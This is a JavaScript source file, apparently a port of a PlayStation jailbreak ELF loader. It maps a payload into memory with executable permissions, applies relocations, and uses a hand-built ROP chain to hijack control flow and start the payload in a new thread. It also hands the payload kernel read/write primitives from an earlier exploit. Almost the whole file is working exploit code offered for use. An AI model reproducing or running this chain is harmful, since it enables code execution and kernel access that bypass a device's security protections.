// https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/elf_loader.lua
// Only expected to load john tornblom's elfldr.elf
// credit to nullptr for porting to lua and specter for the original code
// credit to c0w-ar for isolating rop chain to improve stability

const ELF_SHADOW_MAPPING_ADDR = 0x920100000n;
const ELF_MAPPING_ADDR = 0x926100000n;

async function elf_parse(elf_store) {

    // ELF sizes and offsets
    const SIZE_ELF_HEADER = 0x40n;
    const SIZE_ELF_PROGRAM_HEADER = 0x38n;
    const SIZE_ELF_SECTION_HEADER = 0x40n;

    const OFFSET_ELF_HEADER_ENTRY = 0x18n;
    const OFFSET_ELF_HEADER_PHOFF = 0x20n;
    const OFFSET_ELF_HEADER_SHOFF = 0x28n;
    const OFFSET_ELF_HEADER_PHNUM = 0x38n;
    const OFFSET_ELF_HEADER_SHNUM = 0x3cn;

    const OFFSET_PROGRAM_HEADER_TYPE = 0x00n;
    const OFFSET_PROGRAM_HEADER_FLAGS = 0x04n;
    const OFFSET_PROGRAM_HEADER_OFFSET = 0x08n;
    const OFFSET_PROGRAM_HEADER_VADDR = 0x10n;
    const OFFSET_PROGRAM_HEADER_FILESZ = 0x20n;
    const OFFSET_PROGRAM_HEADER_MEMSZ = 0x28n;

    const OFFSET_SECTION_HEADER_TYPE = 0x4n;
    const OFFSET_SECTION_HEADER_OFFSET = 0x18n;
    const OFFSET_SECTION_HEADER_SIZE = 0x20n;

    const OFFSET_RELA_OFFSET = 0x00n;
    const OFFSET_RELA_INFO = 0x08n;
    const OFFSET_RELA_ADDEND = 0x10n;

    const RELA_ENTSIZE = 0x18n;

    // Allocate memory for ELF data and copy it
    const elf_entry = read64_uncompressed(elf_store + OFFSET_ELF_HEADER_ENTRY);
    const elf_entry_point = ELF_MAPPING_ADDR + elf_entry;

    const elf_program_headers_offset = read64_uncompressed(elf_store + OFFSET_ELF_HEADER_PHOFF);
    const elf_program_headers_num = read16_uncompressed(elf_store + OFFSET_ELF_HEADER_PHNUM);

    const elf_section_headers_offset = read64_uncompressed(elf_store + OFFSET_ELF_HEADER_SHOFF);
    const elf_section_headers_num = read16_uncompressed(elf_store + OFFSET_ELF_HEADER_SHNUM);

    let executable_start = 0n;
    let executable_end = 0n;

    // Parse program headers
    for (let i = 0n; i < elf_program_headers_num; i++) {
        const phdr_offset = elf_program_headers_offset + (i * SIZE_ELF_PROGRAM_HEADER);
        const p_type = read32_uncompressed(elf_store + phdr_offset + OFFSET_PROGRAM_HEADER_TYPE);
        const p_flags = read32_uncompressed(elf_store + phdr_offset + OFFSET_PROGRAM_HEADER_FLAGS);
        const p_offset = read64_uncompressed(elf_store + phdr_offset + OFFSET_PROGRAM_HEADER_OFFSET);
        const p_vaddr = read64_uncompressed(elf_store + phdr_offset + OFFSET_PROGRAM_HEADER_VADDR);
        const p_filesz = read64_uncompressed(elf_store + phdr_offset + OFFSET_PROGRAM_HEADER_FILESZ);
        const p_memsz = read64_uncompressed(elf_store + phdr_offset + OFFSET_PROGRAM_HEADER_MEMSZ);
        const aligned_memsz = (p_memsz + 0x3FFFn) & 0xFFFFC000n;

        if (p_type === 0x01n) {
            const PROT_RW = PROT_READ | PROT_WRITE;
            const PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;

            if ((p_flags & 0x1n) === 0x1n) {
                executable_start = p_vaddr;
                executable_end = p_vaddr + p_memsz;

                // Create shm with exec permission
                const exec_handle = syscall(SYSCALL.jitshm_create, 0n, aligned_memsz, 0x7n);

                // Create shm alias with write permission
                const write_handle = syscall(SYSCALL.jitshm_alias, exec_handle, 0x3n);

                // Map shadow mapping and write into it
                syscall(SYSCALL.mmap, ELF_SHADOW_MAPPING_ADDR, aligned_memsz,
                        PROT_RW, 0x11n, write_handle, 0n);

                // Copy data to shadow mapping
                for (let j = 0n; j < p_memsz; j++) {
                    const byte = read8_uncompressed(elf_store + p_offset + j);
                    write8_uncompressed(ELF_SHADOW_MAPPING_ADDR + j, byte);
                }

                // Map executable segment
                syscall(SYSCALL.mmap, ELF_MAPPING_ADDR + p_vaddr, aligned_memsz,
                        PROT_RWX, 0x11n, exec_handle, 0n);
            } else {

                // Copy regular data segment
                syscall(SYSCALL.mmap, ELF_MAPPING_ADDR + p_vaddr, aligned_memsz,
                        PROT_RW, 0x1012n, 0xFFFFFFFFn, 0n);

                // Copy data
                for (let j = 0n; j < p_memsz; j++) {
                    const byte = read8_uncompressed(elf_store + p_offset + j);
                    write8_uncompressed(ELF_MAPPING_ADDR + p_vaddr + j, byte);
                }
            }
        }
    }

    // Apply relocations
    for (let i = 0n; i < elf_section_headers_num; i++) {
        const shdr_offset = elf_section_headers_offset + (i * SIZE_ELF_SECTION_HEADER);

        const sh_type = read32_uncompressed(elf_store + shdr_offset + OFFSET_SECTION_HEADER_TYPE);
        const sh_offset = read64_uncompressed(elf_store + shdr_offset + OFFSET_SECTION_HEADER_OFFSET);
        const sh_size = read64_uncompressed(elf_store + shdr_offset + OFFSET_SECTION_HEADER_SIZE);

        if (sh_type === 0x4n) {
            const rela_table_count = sh_size / RELA_ENTSIZE;

            // Parse relocs and apply them
            for (let j = 0n; j < rela_table_count; j++) {
                const rela_entry_offset = sh_offset + j * RELA_ENTSIZE;
                const r_offset = read64_uncompressed(elf_store + rela_entry_offset + OFFSET_RELA_OFFSET);
                const r_info = read64_uncompressed(elf_store + rela_entry_offset + OFFSET_RELA_INFO);
                const r_addend = read64_uncompressed(elf_store + rela_entry_offset + OFFSET_RELA_ADDEND);

                if ((r_info & 0xFFn) === 0x08n) {
                    let reloc_addr = ELF_MAPPING_ADDR + r_offset;
                    const reloc_value = ELF_MAPPING_ADDR + r_addend;

                    // If the relocation falls in the executable section, we need to redirect the write to the
                    // writable shadow mapping or we'll crash
                    if (r_offset >= executable_start && r_offset < executable_end) {
                        reloc_addr = ELF_SHADOW_MAPPING_ADDR + r_offset;
                    }

                    write64_uncompressed(reloc_addr, reloc_value);
                }
            }
        }
    }
    return elf_entry_point;
}



function spawn_thread_and_wait(thr_handle_addr, elf_entry_point, args, timespec_addr) {

    // Get PID using syscall primitive lol
    const pid = syscall(SYSCALL.getpid);

    write64(add_rop_smash_code_store, 0xab0025n);
    real_rbp = addrof(rop_smash(1)) + 0x700000000n + 1n;

    let i = 0;

    // Arguments for thread creation
    fake_rop[i++] = g.get('pop_rdi');
    fake_rop[i++] = thr_handle_addr;
    fake_rop[i++] = g.get('pop_rsi');
    fake_rop[i++] = elf_entry_point;
    fake_rop[i++] = g.get('pop_rdx');
    fake_rop[i++] = args;
    fake_rop[i++] = g.get('pop_rcx');
    fake_rop[i++] = 0n;
    fake_rop[i++] = g.get('pop_r8');
    fake_rop[i++] = 0n;
    fake_rop[i++] = g.get('pop_r9');
    fake_rop[i++] = 0n;

    // Create Thread
    fake_rop[i++] = Thrd_create;

    // Nanosleep syscall
    fake_rop[i++] = g.get('pop_rdi');
    fake_rop[i++] = timespec_addr;
    fake_rop[i++] = g.get('pop_rsi');
    fake_rop[i++] = 0n;
    fake_rop[i++] = g.get('pop_rax');
    fake_rop[i++] = 0xf0n;
    fake_rop[i++] = syscall_wrapper;

    // Kill process
    fake_rop[i++] = g.get('pop_rdi');
    fake_rop[i++] = pid;
    fake_rop[i++] = g.get('pop_rsi');
    fake_rop[i++] = 9n;                        // SIGKILL
    fake_rop[i++] = g.get('pop_rax');
    fake_rop[i++] = 0x25n;
    fake_rop[i++] = syscall_wrapper;

    write64(add_rop_smash_code_store, 0xab00260325n);
    fake_rw[59] = (fake_frame & 0xffffffffn);
    rop_smash(fake_obj_arr[0]);
}


async function elf_run(elf_entry_point, payloadout) {
    logger.flush();
    const rwpipe = malloc(8);
    const rwpair = malloc(8);
    const args = malloc(0x30);
    const thr_handle_addr = malloc(8);
    const timespec_addr = malloc(16);  // timespec structure: {tv_sec, tv_nsec}

    write32_uncompressed(rwpipe, ipv6_kernel_rw.data.pipe_read_fd);
    write32_uncompressed(rwpipe + 0x4n, ipv6_kernel_rw.data.pipe_write_fd);

    write32_uncompressed(rwpair, ipv6_kernel_rw.data.master_sock);
    write32_uncompressed(rwpair + 0x4n, ipv6_kernel_rw.data.victim_sock);

    // Setup timespec for nanosleep: 0.02 second delay
    write64_uncompressed(timespec_addr, 0n);           // tv_sec = 0 second
    write64_uncompressed(timespec_addr + 8n, 250000000n);      // tv_nsec = 10000000 nanoseconds

    // We are reusing syscall_wrapper from gettimeofdayAddr
    write64_uncompressed(args + 0x00n, syscall_wrapper - 0x7n);                  // arg1 = syscall wrapper
    write64_uncompressed(args + 0x08n, rwpipe);                                  // arg2 = int *rwpipe[2]
    write64_uncompressed(args + 0x10n, rwpair);                                  // arg3 = int *rwpair[2]
    write64_uncompressed(args + 0x18n, ipv6_kernel_rw.data.pipe_addr);           // arg4 = uint64_t kpipe_addr
    write64_uncompressed(args + 0x20n, kernel.addr.data_base);                   // arg5 = uint64_t kdata_base_addr
    write64_uncompressed(args + 0x28n, payloadout);                              // arg6 = int *payloadout

    // Spawn elf in new thread, sleep, then exit
    spawn_thread_and_wait(thr_handle_addr, elf_entry_point, args, timespec_addr);

    // After this point we cannot use the ROP (process will exit)
}


async function elf_loader() {
    try {

        check_jailbroken();

        logger.log("Loading elfldr.elf from proxy");
        logger.flush();

        const elf_data = malloc(500*1024);
        let elf_size = fetch_file("elfldr.elf", elf_data, 500*1024);

        if(elf_size < 1000) {
            throw new Error("Something went wrong while reading elfldr.elf");
        }
        const elf_entry_point = await elf_parse(elf_data); // We pass the buffer pointer directly

        const payloadout = malloc(4);
        await elf_run(elf_entry_point, payloadout);

        logger.log("Done");
        logger.flush();

    } catch (e) {
        logger.log("elfloader js Error: " + e.message);
        logger.log(e.stack);
        throw e;
    }
}

elf_loader();
